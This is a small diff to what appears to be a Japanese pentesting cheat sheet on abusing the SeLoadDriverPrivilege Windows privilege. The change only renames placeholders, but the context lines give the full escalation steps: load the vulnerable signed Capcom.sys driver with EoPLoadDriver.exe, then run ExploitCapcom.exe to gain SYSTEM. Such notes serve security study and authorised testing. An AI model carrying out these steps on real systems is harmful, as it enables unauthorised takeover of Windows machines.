@@ -27,7 +27,7 @@ summary: カーネルドライバをロードできる特権。脆弱な署名�
 whoami /priv
 
 # 特権を有効にしてドライバを登録・ロードする（例: 脆弱な署名済みドライバ Capcom.sys）
-.\EoPLoadDriver.exe System\CurrentControlSet\<service-name> C:\Users\<user>\Capcom.sys
+.\EoPLoadDriver.exe System\CurrentControlSet\<SERVICE_NAME> C:\Users\<USER>\Capcom.sys
 
 # ロードしたドライバの機能を使って SYSTEM 権限でコマンドを実行する
 .\ExploitCapcom.exe
